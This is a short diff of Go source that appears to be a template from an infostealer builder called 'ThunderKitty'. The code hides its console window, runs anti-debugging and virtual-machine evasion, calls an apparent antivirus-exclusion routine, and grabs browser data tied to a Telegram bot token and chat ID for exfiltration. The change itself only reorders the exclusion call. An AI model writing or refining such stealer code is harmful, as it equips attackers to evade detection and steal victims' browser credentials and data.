@@ -37,13 +37,13 @@ func main() {
 	} else {
 		fmt.Println("Console window not hidden")
 	}
-	Exclude.FileExtensions()
-	if %t {
+ 	if %t {
 		AntiDebugVMAnalysis.ThunderKitty()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
 
+	Exclude.FileExtensions()
 	if %t {
 		browsers.ThunderKittyGrab(telebottoken, telechatid)
 	} else {
